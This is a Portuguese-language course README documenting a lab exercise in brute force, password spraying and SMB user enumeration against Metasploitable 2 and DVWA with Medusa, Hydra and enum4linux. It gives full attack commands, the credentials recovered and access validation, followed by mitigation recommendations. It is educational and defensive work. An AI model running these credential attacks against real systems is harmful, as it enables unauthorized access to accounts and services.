# Simulando Ataques de Brute Force de Senhas com Medusa e Kali Linux

Repositório de documentação técnica e prática desenvolvido para o desafio de projeto da **DIO (Digital Innovation One)** sobre auditoria de segurança, testes de força bruta e medidas de mitigação em ambientes controlados.

---

## Visão Geral do Projeto

Este projeto demonstra, em ambiente de laboratório isolado, como ocorrem ataques de adivinhação de credenciais contra serviços de rede comuns (**FTP**, **Aplicações Web / DVWA** e **SMB**) utilizando o **Kali Linux** e a ferramenta **Medusa**, além de apresentar estratégias práticas de defesa e mitigação para proteger infraestruturas corporativas.

### Objetivos Técnicos
- Estruturar um laboratório seguro com máquinas virtuais isoladas em rede *Host-Only*.
- Compreender as diferenças operacionais entre **Brute Force Tradicional**, **Password Spraying** e **Credential Stuffing**.
- Realizar enumeração de serviços e usuários com **Nmap** e **Enum4linux**.
- Executar testes de força bruta em **FTP**, **Formulários Web (DVWA)** e **SMB** com **Medusa**.
- Validar acessos obtidos utilizando clientes nativos (`ftp`, `smbclient`).
- Propor políticas de *hardening* e mitigação contra ataques de autenticação.

---

## Fundamentação Teórica

### Tipos de Ataques de Autenticação
1. **Brute Force (Força Bruta Tradicional):** Testa sistematicamente múltiplas combinações de senhas (via tentativa exaustiva ou dicionário/wordlist) contra um ou mais usuários. Gera alto volume de tráfego e logs.
2. **Password Spraying (Pulverização de Senhas):** Testa **uma única senha comum** (ex: `Mudar@123`, `admin`, `123456`) contra **uma grande lista de usuários válidos**. Essa abordagem evita o bloqueio de contas (*account lockout*), pois realiza poucas tentativas por usuário em intervalos espaçados.
3. **Credential Stuffing:** Utiliza pares de credenciais (`usuário:senha`) vazados de outras plataformas para tentar autenticação automatizada em outros serviços, explorando a reutilização de senhas pelos usuários.

### Ferramentas do Ecossistema Kali Linux Estudadas
| Ferramenta | Foco Principal | Características |
| :--- | :--- | :--- |
| **Medusa** | Brute force paralelo em serviços de rede | Rápido, modular, suporte a múltiplas threads (`-M ftp`, `ssh`, `smbnt`, `http`). |
| **Hydra** | Brute force multiprotocolo | Excelente suporte a formulários web (`http-get-form`, `http-post-form`) e dezenas de protocolos. |
| **Ncrack** | Auditoria de autenticação de rede de alta velocidade | Desenvolvido pelo projeto Nmap, focado em grandes redes. |
| **John the Ripper** | Quebra de hashes *offline* | Ideal para auditoria de arquivos `/etc/shadow` e hashes extraídos. |
| **WPScan** | Auditoria focada em WordPress | Enumera usuários, plugins vulneráveis e realiza brute force em `wp-login.php` / `xmlrpc.php`. |
| **Patator** | Fuzzing e brute force modular multiuso | Altamente flexível e configurável para fluxos de autenticação customizados. |

---

## Configuração do Ambiente (Laboratório)

O laboratório foi configurado no **Oracle VirtualBox** utilizando duas máquinas virtuais conectadas em uma rede interna isolada (**Host-Only Adapter**), garantindo que nenhum tráfego de teste saia para a rede externa:

- **Máquina Atacante:** Kali Linux (`192.168.56.101`)
- **Máquina Alvo:** Metasploitable 2 (`192.168.56.102`)
- **Máscara de Sub-rede:** `255.255.255.0` (`/24`)

### Reconhecimento Inicial e Descoberta de Serviços

Verificação de conectividade e varredura de portas na máquina alvo com o **Nmap**:

```bash
# Identificando o IP da máquina Kali
ip addr show eth0

# Descobrindo hosts ativos na rede Host-Only
nmap -sn 192.168.56.0/24

# Escaneando serviços e versões abertas no Metasploitable 2
nmap -sV -p 21,80,139,445 192.168.56.102
```

**Saída resumida do Nmap:**
```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

---

## Criação de Wordlists

Para os testes controlados, foram estruturadas três listas no diretório `wordlists/`:

1. **`wordlists/users.txt`**: Lista de nomes de usuários comuns e administrativos.
2. **`wordlists/passwords.txt`**: Lista de senhas fracas e padrões de sistema.
3. **`wordlists/smb_users.txt`**: Lista de usuários extraídos durante a etapa de enumeração SMB.

Também é possível gerar wordlists customizadas com o utilitário **Crunch** no Kali Linux:
```bash
# Exemplo: gerando combinações numéricas de 4 a 6 dígitos
crunch 4 6 0123456789 -o wordlists/custom_numeric.txt
```

---

## Execução dos Cenários Práticos

### Cenário 1: Ataque de Força Bruta em Servidor FTP

O objetivo deste teste é identificar credenciais fracas no serviço FTP (`vsftpd`) rodando na porta `21` do Metasploitable 2.

#### 1. Executando o ataque com Medusa
```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4
```
**Parâmetros utilizados:**
- `-h 192.168.56.102`: Endereço IP do host alvo.
- `-U wordlists/users.txt`: Arquivo contendo a lista de usuários.
- `-P wordlists/passwords.txt`: Arquivo contendo a lista de senhas.
- `-M ftp`: Módulo do protocolo FTP.
- `-t 4`: Número de conexões paralelas (threads).

#### 2. Resultado Obtido
```text
Medusa v2.2 [[http://www.foofus.net](http://www.foofus.net)] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: msfadmin Pass: msfadmin
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Pass: msfadmin [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: user Pass: user [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: postgres Pass: postgres [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: service Pass: service [SUCCESS]
```

#### 3. Validação de Acesso
```bash
ftp 192.168.56.102
# Name: msfadmin
# Password: msfadmin
# 230 Login successful.
```

---

### Cenário 2: Automação de Tentativas em Formulário Web (DVWA)

O **DVWA (Damn Vulnerable Web Application)** está hospedado no Metasploitable 2 em `http://192.168.56.102/dvwa/`. Com o nível de segurança configurado em **Low**, a página `/dvwa/vulnerabilities/brute/` não possui proteção contra automação, CAPTCHA ou limite de tentativas.

#### 1. Inspeção da Requisição
Ao inspecionar a aba *Network* do navegador ao submeter o formulário de Brute Force no DVWA:
- **URL Alvo:** `http://192.168.56.102/dvwa/vulnerabilities/brute/`
- **Parâmetros GET:** `username=admin&password=<SENHA>&Login=Login`
- **Cookies necessários:** `security=low; PHPSESSID=<SESSAO_ATIVA>`
- **Mensagem de falha:** `Username and/or password incorrect.`

#### 2. Testando com Medusa (Módulo Web/HTTP) e Limitações Práticas
```bash
medusa -h 192.168.56.102 -u admin -P wordlists/passwords.txt -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/" \
  -m DENY-SIGNAL:"Username and/or password incorrect." \
  -m FORM-DATA:"get?username=admin&password=&Login=Login"
```

> **Nota Técnica sobre as Limitações do Medusa em Formulários Web:**
> O módulo `web-form` do Medusa possui limitações conhecidas ao lidar com sessões autenticadas por cookies customizados (`PHPSESSID`), redirecionamentos `302` e tokens anti-CSRF dinâmicos. Em auditorias reais de formulários HTTP, o uso em conjunto com o **Hydra** (`http-get-form`) ou scripts automatizados entrega maior precisão na validação da string de resposta:

```bash
# Alternativa complementar com Hydra utilizando o Cookie de sessão do DVWA
hydra -l admin -P wordlists/passwords.txt 192.168.56.102 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=a1b2c3d4e5f6"
```

#### 3. Resultado Obtido
- **Usuário:** `admin`
- **Senha identificada:** `password`
- **Validação:** Acesso confirmado com a mensagem `Welcome to the password protected area admin`.

---

### Cenário 3: Ataque em Cadeia — Enumeração SMB e Password Spraying

Em ambientes corporativos mal configurados, o protocolo **SMB (Server Message Block)** frequentemente permite sessões nulas (*Null Sessions*), expondo a lista completa de usuários do domínio ou servidor.

#### 1. Enumeração de Usuários via SMB
Utilizando o **enum4linux** e scripts NSE do **Nmap** para listar os usuários existentes na máquina alvo sem precisar de credenciais prévias:

```bash
# Enumeração completa de usuários SMB
enum4linux -U 192.168.56.102

# Alternativa via Nmap NSE Script
nmap -p 139,445 --script smb-enum-users.nse 192.168.56.102
```

**Usuários enumerados e salvos em `wordlists/smb_users.txt`:**
`msfadmin`, `user`, `postgres`, `service`, `games`, `nobody`, `bind`, `proxy`, `syslog`, `www-data`, `root`.

#### 2. Executando o Password Spraying com Medusa
Em vez de testar centenas de senhas em um único usuário (o que bloquearia a conta em um Active Directory real), testamos **uma única senha provável por vez** (`-p`) contra toda a lista de usuários (`-U`):

```bash
# 1ª Rodada de Password Spraying testando a senha "msfadmin"
medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p msfadmin -M smbnt

# 2ª Rodada de Password Spraying testando a senha "user"
medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p user -M smbnt
```

**Saída do Medusa:**
```text
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Pass: msfadmin [SUCCESS]
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: user Pass: user [SUCCESS]
```

#### 3. Testando e Validando o Acesso com `smbclient`
Com a credencial `msfadmin:msfadmin` descoberta, validamos os compartilhamentos disponíveis e acessamos o diretório remoto:

```bash
# Listando compartilhamentos SMB disponíveis no servidor
smbclient -L //192.168.56.102 -U msfadmin

# Conectando ao compartilhamento /tmp com as credenciais obtidas
smbclient //192.168.56.102/tmp -U msfadmin
```

**Saída da validação:**
```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))

smb: \> ls
  .                                   D        0  Wed Nov 18 06:40:12 2026
  ..                                  DR       0  Wed Nov 18 06:15:00 2026
```

---

## Recomendações de Mitigação e Prevenção

A partir das vulnerabilidades exploradas nos três cenários, as seguintes medidas de segurança devem ser implementadas:

1. **Política de Bloqueio de Conta (Account Lockout) e Rate Limiting:**
   - Configurar bloqueio temporário após um número reduzido de falhas consecutivas (ex: 5 tentativas inválidas em 15 minutos) e atraso progressivo (*exponential backoff*) nas respostas de login.
2. **Autenticação Multifator (MFA / 2FA):**
   - Exigir segundo fator de autenticação em interfaces web, VPNs e acessos administrativos, neutralizando o impacto de senhas descobertas via *Password Spraying* ou *Credential Stuffing*.
3. **Políticas de Senhas Fortes e Auditoria de Senhas Vazadas:**
   - Impor comprimento mínimo (12+ caracteres), complexidade e proibir senhas iguais ao nome de usuário ou presentes em listas de senhas comuns.
4. **Hardening do Serviço SMB:**
   - Desabilitar sessões anônimas (*Null Sessions*) configurando `restrict anonymous = 2` no `smb.conf` (Samba) ou via GPO no Windows Server, impedindo a enumeração prévia de usuários.
   - Desativar SMBv1 e exigir assinatura digital de pacotes (*SMB Signing*).
5. **Substituição de Protocolos Legados Inseguros:**
   - Substituir o protocolo **FTP** (que trafega credenciais em texto claro) por **SFTP/SCP** com autenticação baseada em chaves criptográficas SSH e desabilitar autenticação por senha (`PasswordAuthentication no`).
6. **Proteção em Formulários Web:**
   - Implementar **Tokens Anti-CSRF** únicos por requisição, **CAPTCHA** adaptativo após tentativas falhas e **WAF (Web Application Firewall)** ou **Fail2Ban** para bloquear IPs com comportamento automatizado.
7. **Monitoramento e Detecção (SIEM / IDS):**
   - Monitorar eventos repetidos de falha de logon (como Event ID `4625` no Windows ou logs `/var/log/auth.log` no Linux) para detectar padrões de *Password Spraying* em tempo real.

---

## Estrutura do Repositório

```text
├── README.md
└── wordlists/
    ├── users.txt
    ├── passwords.txt
    └── smb_users.txt
```

---
*Projeto desenvolvido exclusivamente para fins educacionais em ambiente controlado.*
